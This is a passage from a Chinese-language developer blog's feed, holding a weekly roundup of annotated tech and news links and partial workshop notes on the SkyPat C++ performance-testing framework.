&lt;li&gt;&lt;a href="http://tools.cloudxns.net/"&gt;http://tools.cloudxns.net/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.greatfire.org/analyzer"&gt;https://en.greatfire.org/analyzer&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;可能會把這個整理成一篇文章吧，最近公司因為某個大客戶，所以一直得處理跟中國網路有關的問題，快發瘋了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;taiwan&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.cw.com.tw/blog/blogTopic.action?id=601&amp;amp;nid=7088&amp;amp;page=1"&gt;虱目魚的眼淚──被謊言、算計與顢頇之海包圍的台灣漁民｜呂政達／沙漠裡的雲林漁人｜Crossing 換日線&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;原來虱目魚的出口量有這麼大啊，雖然八成都還是內銷就是，但即便是兩成的外銷都還有約一萬公噸哪。  &lt;/li&gt;
&lt;li&gt;「虱目魚全身基本上有 222 根魚刺」  &lt;/li&gt;
&lt;li&gt;「這條魚真的很酷喔！全世界就這麼一科一屬一種。主要在印度洋、太平洋海域生活（大西洋沒有虱目魚），從非洲的東岸，到印度，再一直到紐西蘭、夏威夷...... 再到墨西哥都有。往北，則會到日本的南邊。它真的分佈很廣，主要在溫熱帶的海域。」  &lt;/li&gt;
&lt;li&gt;「台灣的虱目魚養殖，大概是在荷人治台期間傳入的，到現在也已經有三百多年歷史了。早期從漁民們把海邊的虱目魚魚苗直接抓起來，放到池子去圈養這種簡單的方式，再一步步地把水產養殖對於種苗、營養、商業考量等等因素放進去，如今已變成單位水體養殖越來越密、越來越多、及越來越便宜的大規模生產。」  &lt;/li&gt;
&lt;li&gt;「從政府關務署資料顯示，2011 台灣出口 900 噸虱目魚到中國，最高出口量為 2014 的 1,500 噸左右。但去年 2015 年，台灣總共只有出口 1.9 噸虱目魚到中國。」  &lt;/li&gt;
&lt;li&gt;「這樣的數字差異，不難想像中國市場對台灣虱目魚的「真實需要」如何。以台灣年產約 6 萬噸虱目魚的比例來說，中國進口台灣虱目魚，一度高達年產量的 2.5%，但結束契作後我們看到真正的實際需求，其實只有萬分之三（0.03%）的比重。」  &lt;/li&gt;
&lt;li&gt;「更諷刺的是，兩個阿拉伯國家，這五年來大概都從台灣進口 5,000 噸上下的虱目魚，但是台灣人卻在意一個最多只有進口 1,500 噸、實際需求更只有 2 噸不到的國家，到這種程度。」  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="container"></category><category term="firebase"></category><category term="gae"></category><category term="git"></category><category term="python"></category><category term="taiwan"></category><category term="tool"></category></entry><entry><title>Y2016W41</title><link href="https://blog.m157q.tw/posts/2016/10/17/y2016w41/" rel="alternate"></link><published>2016-10-29T01:18:18+08:00</published><updated>2016-10-29T01:18:18+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2016-10-17:posts/2016/10/17/y2016w41/</id><summary type="html">&lt;h3&gt;blog&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://medium.com/@fchern/%E9%97%9C%E6%96%BC%E8%AE%8A%E5%BC%B7%E9%80%99%E6%AA%94%E4%BA%8B-%E4%B8%83-3c80453eea2b#.61twki31m"&gt;關於變強這檔事（七）&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;「我想微笑的地方，不是週末的小出遊，而是在世界的舞台上。」  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;django&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://djangopackages.org/"&gt;Django Packages&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這個網站把 Django Apps 分門別類的整理  &lt;/li&gt;
&lt;li&gt;好像有點猛啊  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/jpadilla/django-project-template/"&gt;jpadilla/django-project-template: Project template layout for Django 1.10 &lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;最近新開的一個 django 專案有用到這個，感覺還不錯用，最明顯的應該是 django 的 setting.py 裡頭的 secret key 不會洩漏啦，已經用 django-configuration 幫忙設定好了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;docker&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://hyper.sh/"&gt;Hyper.sh - Effortless Docker Hosting&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;看了一下 demo 好像有點猛啊，三兩下就可以使用 remote 的 docker 了？  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;git&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/esrlabs/git-repo"&gt;esrlabs/git-repo: repo - The multiple repository tool (also works on MS Win&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;忘了為什麼會看到這個東西了...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/pre-commit/pre-commit"&gt;pre-commit/pre-commit: A framework for managing and maintaining multi-langu&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;git 的 pre-commit 的複雜程度已經到有人需要一個 framework 來管理的程度了  &lt;/li&gt;
&lt;li&gt;這 framework 還有些預設的 pre-commit hooks 可以用  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/pre-commit/pre-commit-hooks/tree/master/pre_commit_hooks"&gt;pre-commit-hooks/pre_commit_hooks at master ‧ pre-commit/pre-commit-hooks&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;github&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/Blazemeter/taurus"&gt;Automation-friendly framework for Continuous Testing by&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;可以寫個 &lt;code&gt;yaml&lt;/code&gt; 設定檔來跑測試  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/tldr-pages/tldr"&gt;tldr-pages/tldr: Simplified and community-driven man pages&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;簡化版的 man page，有 web, cli 還有許多語言的版本，號稱涵蓋 UNIX / Linux / OSX / SunOS , 雖然我稍微看了一下是少了滿多東西就是了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;google&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://analytics.googleblog.com/2016/10/improvements-coming-to-google-analytics.html"&gt;Improvements coming to the Google Analytics desktop UI&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Google Analytics 的桌面版介面要改版了呀  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.inside.com.tw/2016/10/16/google-is-splitting-its-search-index-prioritizing-mobile-over-desktop"&gt;Google 搜尋重大調整：打造獨立行動搜尋索引，與桌機版分開運行&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;可以搜尋到 App 的內容再加上使用 deep link 也太歡樂了吧  &lt;/li&gt;
&lt;li&gt;感覺重點應該是之後可以拿來投放廣告  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;k8s&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.ithome.com.tw/news/108748"&gt;【大規模容器叢集實例】雷亞遊戲借助Kubernetes，3人搞定百萬玩家App底層維運&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;k8s 業配文 （誤  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;linux&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://blog.longwin.com.tw/2016/09/linux-tail-follow-file-rotate-2016/"&gt;Linux tail 遇到 file rotate 要如何持續追蹤讀取&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;看來要從 &lt;code&gt;tail -f&lt;/code&gt; 改成用 &lt;code&gt;tail -F&lt;/code&gt; 啦  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;machine learning&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://keras.io/"&gt;Keras Documentation&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;幫忙把 Theano 跟 TensorFlow 包起來一起用的 framework  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;misc&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://denny.qollie.com/2016/09/21/corp-gov-shit/"&gt;創業的第零步：公司設立&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;開公司真的很多有的沒的得注意啊  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.theearthawaits.com/"&gt;The Earth Awaits - Find Cities in Your Budget&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;幫你找邊旅遊邊工作的理想地點（？  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.gslin.org/archives/2016/10/04/6901/%e6%8a%8a-csc-%e5%8d%a1%e7%89%87%e8%83%8c%e9%9d%a2%e7%9a%84%e4%b8%89%e7%a2%bc-%e8%ae%8a%e6%88%90-otp-%e5%8b%95%e6%85%8b%e5%af%86%e7%a2%bc/"&gt;把 CSC (卡片背面的三碼) 變成 OTP (動態密碼)&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;感覺就是加入了 2FA 的信用卡跟金融卡  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.aaronsw.com/weblog/hatethenews"&gt;I Hate the News (Aaron Swartz's Raw Thought)&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;看新聞很浪費時間，因為看與不看都對我們的生活沒多大的影響，不如專注在自己真正該做的事。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;programmer&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://medium.com/@shemag8/fuck-you-startup-world-ab6cc72fad0e#.6crscnb5z"&gt;Fuck You Startup World&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;又是一篇怨念很深的文章  &lt;/li&gt;
&lt;li&gt;超時工作、吃垃圾食物、鋪張浪費的活動、追不完的科技新聞、各種縮寫、說看電視浪費時間但都在討論網飛  &lt;/li&gt;
&lt;li&gt;算是高等級的靠北工程師文章吧  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;programming&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://medium.com/@c9s/%E8%AB%87%E6%9E%B6%E6%A7%8B%E4%B9%8B%E7%9C%BC%E9%AB%98%E6%89%8B%E4%BD%8E-2f4e0c65faee"&gt;談架構之必要 — Medium&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;一年後再看一次  &lt;/li&gt;
&lt;li&gt;自己好像就是那種眼高手低的工程師啊  &lt;/li&gt;
&lt;li&gt;引以為戒  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;python&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://outofmemory.cn/code-snippet/4092/python-json-charset-type"&gt;为程序员服务&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;json.dumps()&lt;/code&gt; 要顯示中文的話記得要加上 &lt;code&gt;ensure_ascii=False&lt;/code&gt; 這個 option。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://stackoverflow.com/questions/11093236/use-logging-print-the-output-of-pprint"&gt;python - Use logging print the output of pprint - Stack Overflow&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;用 &lt;code&gt;pprint.pformat&lt;/code&gt; 可以在 &lt;code&gt;logging&lt;/code&gt; 中達到一般 &lt;code&gt;pprint&lt;/code&gt; 的效果，讓 &lt;code&gt;logging&lt;/code&gt; 的輸出更好看。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/sylnsfar/qrcode/"&gt;sylnsfar/qrcode: artistic QR Code in Python （Animated GIF qr code）- Python &lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;竟然可以用 Python 做出這麼酷的 QR Code  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;rust&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.gslin.org/archives/2016/09/24/6865/%e7%94%a8-rust-%e5%af%ab%e7%9a%84-ripgrep/"&gt;用 Rust 寫的 ripgrep&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;「ripgrep 是用 Rust 寫的強化版 grep 工具，也就是類似於 ag 或是 ack 的工具，但想辦法讓執行的速度更快，盡可能接近於原始 grep 的速度。」  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/BurntSushi/ripgrep"&gt;BurntSushi/ripgrep: ripgrep combines the usability of The Silver Searcher w&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.burntsushi.net/ripgrep/"&gt;ripgrep is faster than {grep, ag, git grep, ucg, pt, sift} - Andrew Gallant&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;security&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/orangetw/My-CTF-Web-Challenges"&gt;orangetw/My-CTF-Web-Challenges: Collection of CTF Web challenges I made&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Orange 出過的題目  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.ruanyifeng.com/blog/2016/09/csp.html"&gt;Content Security Policy 入门教程&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;網頁如果要載入其他 domain 的資源，就需要注意一下這個東西。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;web&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.ruanyifeng.com/blog/2016/08/migrate-from-http-to-https.html"&gt;HTTPS 升级指南&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;就是個如何設定 HTTPS 的簡易教學  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.wix.com/"&gt;It All Starts with Your Stunning Website&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;一直看到 youtube 投這個廣告  &lt;/li&gt;
&lt;li&gt;好像可以很快做出很潮的網站  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.rowkey.me/blog/2016/08/30/recommend-sys/"&gt;推荐系统杂谈&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;最近 messenger bot 和各種 bot 崛起，公司想弄個推薦商品的 bot 直接投給使用者，剛好看到這篇，可以參考一下。  &lt;/li&gt;
&lt;li&gt;裡頭提到基本上 80% 都還是使用最多人看的商品、最多人買的商品以及買了這個商品的人還買了哪些商品，這類的推薦最有用。  &lt;/li&gt;
&lt;li&gt;然後還有一些時事性質的活動必須由人工下去推薦，例如：金州勇士隊連勝的話，就可以推薦一下今州勇士隊球衣之類的。  &lt;/li&gt;
&lt;li&gt;而剩下 20% 則是用 Machine Learning，通常這類的效果沒那麼好，如果要達到夠好的程度必須要花非常多的時間去調整。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;work&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://jvns.ca/blog/2016/08/16/how-do-you-work-on-something-important/"&gt;How do you decide what to work on?&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;作者講述自己如何決定要從事哪方面的工作  &lt;ul&gt;
&lt;li&gt;要清楚知道自己的目標  &lt;/li&gt;
&lt;li&gt;工作以後會有很多瑣事，能夠專心在某一件事情上的時間很難得也很可貴。  &lt;/li&gt;
&lt;li&gt;沒有所謂「一定得去做的事」  &lt;/li&gt;
&lt;li&gt;要相信自己想做的事是有可能達成的  &lt;/li&gt;
&lt;li&gt;還有很多事是無法確定或未知的，只有遇到了才能知曉，但可以先做好一些準備。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;javascript, npm&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/yarnpkg/yarn"&gt;yarnpkg/yarn: ?? Fast, reliable, and secure dependency management for JavaS&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;新的 JavaScript package manager，由 Facebook, Google 等大公司聯手推出，強調比 npm 快、比 npm 安全，才短短三天，在 GitHub 上的 star 數量就超過了 npm，看來又要長江後浪推前浪啦。  &lt;/li&gt;
&lt;li&gt;簡直就是為上禮拜才出爐的 &lt;a href="https://hackernoon.com/how-it-feels-to-learn-javascript-in-2016-d3a717dd577f?gi=7a4f7274c1de"&gt;How it feels to learn Javascript in 2016&lt;/a&gt; 做了最好的例證。  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/ihower/status/786767972127809537"&gt;發現 yarn 的 github star 星星數比 npm 還多了&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;trivia&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.zhihu.com/question/33634376/answer/125936478"&gt;有哪些看起來很高端的技術其實原理很暴力很初級？ - windleavez 的回答 - 知乎&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;原來魔獸世界殺了這麼多隱形的兔子啊  &lt;/li&gt;
&lt;li&gt;原來隱形的兔子這麼好用啊  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;youtube&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.youtube.com/watch?v=Rpco93LTOPk"&gt;這我一定吉！反思饒舌《獻給現代教育體制的訴狀》(中文字幕) - YouTube&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;真的是很棒的一部影片啊，對現代教育體制批評得鞭辟入裡。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;批踢踢&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/Soft_Job/M.1475806271.A.4EE.html"&gt;[公司] 竹間智能科技工作心得 (轉錄) - 看板 Soft_Job - 批踢踢實業坊&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;直接列入黑名單啦，這間太誇張了。  &lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;5.老闆和你約開會的時間 經常都約晚上七八九點 或超過十點都有&lt;br /&gt;
而且老闆的行程常delay或更動 可能最後實際開會的時間已到十一點  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;6.據說有同事因為要求加班費 而被約談  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;7.有一次 老闆星期六在微信上說 我們的APP應該要能唱歌/播放歌曲&lt;br /&gt;
到了星期天 老闆說 為什麼還不能播歌 這功能 我今天就要看到一版上線  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;8.曾有同事 因為在假日的晚上十點半被老闆要求立刻實作新功能 本來他們組的PM想安撫&lt;br /&gt;
一下老闆 明天早上再做&lt;br /&gt;
結果老闆在群組裡說 "不是明天 是現在!!"&lt;br /&gt;
於是PM只好晚上11點找工程師來公司寫code 不知道寫到幾點&lt;br /&gt;
沒多久後那位工程師同事離職了」  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;9.之前辦公室有一位做machine learning的同事&lt;br /&gt;
被老闆在微信要求 machine learning 正確率必須要做到 100%&lt;br /&gt;
後來那位同事也離職了  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="blog"></category><category term="django"></category><category term="docker"></category><category term="gae"></category><category term="gcp"></category><category term="git"></category><category term="github"></category><category term="google"></category><category term="https"></category><category term="interview"></category><category term="k8s"></category><category term="linux"></category><category term="machine learning"></category><category term="misc"></category><category term="npm"></category><category term="programmer"></category><category term="programming"></category><category term="ptt"></category><category term="python"></category><category term="qrcode"></category><category term="rust"></category><category term="security"></category><category term="taiwan"></category><category term="trivia"></category><category term="web"></category><category term="work"></category><category term="javascript"></category><category term="youtube"></category><category term="批踢踢"></category></entry><entry><title>Cat System Workshop #12: SkyPat: C++ Performance Analysis and Testing Framework</title><link href="https://blog.m157q.tw/posts/2016/10/11/cat-system-workshop-12-skypat-c-performance-analysis-and-testing-framework/" rel="alternate"></link><published>2016-10-11T19:46:58+08:00</published><updated>2016-10-11T19:46:58+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-10-11:posts/2016/10/11/cat-system-workshop-12-skypat-c-performance-analysis-and-testing-framework/</id><summary type="html">&lt;h2&gt;Info&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Speaker: Peter Chang  &lt;/li&gt;
&lt;li&gt;Event Link: &lt;a href="http://www.accupass.com/go/cat1011"&gt;http://www.accupass.com/go/cat1011&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;GitHub Repo: &lt;a href="https://github.com/skymizer/SkyPat"&gt;https://github.com/skymizer/SkyPat&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Note&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Regions of code  &lt;/li&gt;
&lt;li&gt;SkyPat  &lt;ul&gt;
&lt;li&gt;Define unittest, checking both correctness and performance for you.  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;#include &amp;lt;pat/pat.h&amp;gt;&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;A glace at SkyPat  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;pat/pat.h&amp;gt;  &lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;

&lt;span class="c1"&gt;// In MathCase, fibonacci_test  &lt;/span&gt;
&lt;span class="n"&gt;PAT_F&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;MathCase&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;fibonacci_test&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="p"&gt;{&lt;/span&gt;  
    &lt;span class="n"&gt;ASSERT_TRUE&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fibonacci&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;  
    &lt;span class="n"&gt;EXPECT_EQ&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fibonacci&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;  
    &lt;span class="n"&gt;PERFORM&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;  
        &lt;span class="n"&gt;fibonacci&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;  
    &lt;span class="p"&gt;}&lt;/span&gt;  
&lt;span class="p"&gt;}&lt;/span&gt;  

&lt;span class="c1"&gt;// 一個 case 裏面有很多個 tests  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;Loop-Intensive  &lt;ul&gt;
&lt;li&gt;Benefic Compiler Optimization  &lt;/li&gt;
&lt;li&gt;比較容易展開  &lt;/li&gt;
&lt;li&gt;測試效能也比較沒那麼困難，主要就看這段 code 要被執行幾次。  &lt;/li&gt;
&lt;li&gt;Example:  &lt;ul&gt;
&lt;li&gt;GIMP  &lt;/li&gt;
&lt;li&gt;Skymizer  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Call Intensive  &lt;ul&gt;
&lt;li&gt;Damage Compilter Optimization  &lt;/li&gt;
&lt;li&gt;Difficult to Evaluate  &lt;/li&gt;
&lt;li&gt;比較難處理  &lt;/li&gt;
&lt;li&gt;如果產生得出夠完整的 call graph，可能可以做些優化  &lt;/li&gt;
&lt;li&gt;Loop 展開不太有效果  &lt;/li&gt;
&lt;li&gt;只能試試看能不能減少呼叫  &lt;/li&gt;
&lt;li&gt;有很多不知道的小瓶頸  &lt;/li&gt;
&lt;li&gt;Example:  &lt;ul&gt;
&lt;li&gt;Browsers (Chrome, Firefox)  &lt;/li&gt;
&lt;li&gt;Editors (Evernote, ...)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;ul&gt;
&lt;li&gt;SkyPat 就是專門用來處理 Call Intensive 這種惱人的效能分析的  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;perf&lt;/code&gt; cannot evaluate regions of code.  &lt;/li&gt;
&lt;li&gt;SkyPat integrates &lt;code&gt;perf_event&lt;/code&gt; to evaluate regions of code.  &lt;/li&gt;
&lt;li&gt;"Software Task Clock" is still not cycle-accurate  &lt;/li&gt;
&lt;li&gt;Only cycle-accurate timer w/o OS interference.  &lt;/li&gt;
&lt;li&gt;Can evaluate call-intensive program  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;ul&gt;
&lt;li&gt;Install:  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;$ git clone https://github.com/skymizer/SkyPat.git&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;p&gt;Usage  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;pat/pat.h&amp;gt;  &lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;

&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[])&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;  
    &lt;span class="n"&gt;pat&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;Test&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;Initialize&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;  
    &lt;span class="n"&gt;pat&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;Test&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;RunAll&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;  
&lt;span class="p"&gt;}&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;ul&gt;
&lt;li&gt;SkyPat v3.0 will be released at Oct 30th.  &lt;/li&gt;
&lt;li&gt;Add more Perf events  &lt;/li&gt;
